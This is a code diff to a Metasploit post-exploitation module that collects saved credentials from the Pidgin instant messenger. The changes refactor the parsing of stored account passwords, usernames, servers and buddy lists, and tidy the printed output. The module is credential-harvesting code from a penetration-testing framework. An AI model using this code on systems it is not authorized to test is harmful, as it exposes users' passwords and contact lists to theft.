@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info(info,
-			'Name'           => 'Pidgin Credential Collection',
+			'Name'           => 'Pidgin Instant Messenger Credential Collection',
 			'Description'    => %q{ This module will collect credentials from the pidgin IM client if installed. },
 			'License'        => MSF_LICENSE,
 			'Author'         => 
@@ -226,43 +226,44 @@ class Metasploit3 < Msf::Post
 
 	def parse_accounts(data)
 
-		creds = Array.new
+		creds = []
 		doc = REXML::Document.new(data).root
 
 		doc.elements.each("account") do |sub|
-			account = Hash.new
+			account = {}
 			if sub.elements['password']
 				account['password'] = sub.elements['password'].text
 			else
 				account['password'] = "<unknown>"
 			end
 
-			account['protocol'] = sub.elements['protocol'].text
-			account['user'] = sub.elements['name'].text
-			account['server'] = sub.elements['settings'].elements["setting[@name='server']"].text
-			account['port'] = sub.elements['settings'].elements["setting[@name='port']"].text
+			account['protocol'] = sub.elements['protocol'].text rescue "<unknown>"
+			account['user'] = sub.elements['name'].text rescue "<unknown>"
+			account['server'] = sub.elements['settings'].elements["setting[@name='server']"].text rescue "<unknown>"
+			account['port'] = sub.elements['settings'].elements["setting[@name='port']"].text rescue "<unknown>"
 			creds << account
 
 			print_status("Collected the following credentials:")
-			print_status("Server: %s:%s" % [account['server'], account['port']])
-			print_status("Protocol: %s" % account['protocol'])
-			print_status("Username: %s" % account['user'])
-			print_status("Password: %s\n" % account['password'])
+			print_status("    Server: %s:%s" % [account['server'], account['port']])
+			print_status("    Protocol: %s" % account['protocol'])
+			print_status("    Username: %s" % account['user'])
+			print_status("    Password: %s" % account['password'])
+			print_line("")
 		end
 
 		return creds
 	end
 
 	def parse_buddies(data)
-		buddies = Array.new
+		buddies = []
 
 		doc = REXML::Document.new(data).root
 		doc.elements['blist'].elements.each('group') do |group|
 			group.elements.each('contact') do |bcontact|
-				contact = Hash.new
-				contact['name'] = bcontact.elements['buddy'].elements['name'].text
-				contact['account'] = bcontact.elements['buddy'].attributes['account']
-				contact['protocol'] = bcontact.elements['buddy'].attributes['proto']
+				contact = {}
+				contact['name'] = bcontact.elements['buddy'].elements['name'].text rescue "<unknown>"
+				contact['account'] = bcontact.elements['buddy'].attributes['account'] rescue "<unknown>"
+				contact['protocol'] = bcontact.elements['buddy'].attributes['proto'] rescue "<unknown>"
 				
 				if bcontact.elements['buddy'].elements['alias']
 					contact['alias'] = bcontact.elements['buddy'].elements['alias'].text
@@ -272,10 +273,11 @@ class Metasploit3 < Msf::Post
 
 				buddies << contact
 				print_status("Collected the following contacts:")
-				print_status("Buddy Name: %s" % contact['name'])
-				print_status("Alias: %s" % contact['alias'])
-				print_status("Protocol: %s"  % contact['protocol'])
-				print_status("Account: %s\n"  % contact['account'])
+				print_status("    Buddy Name: %s" % contact['name'])
+				print_status("    Alias: %s" % contact['alias'])
+				print_status("    Protocol: %s"  % contact['protocol'])
+				print_status("    Account: %s"  % contact['account'])
+				print_line("")
 			end
 		end 
 
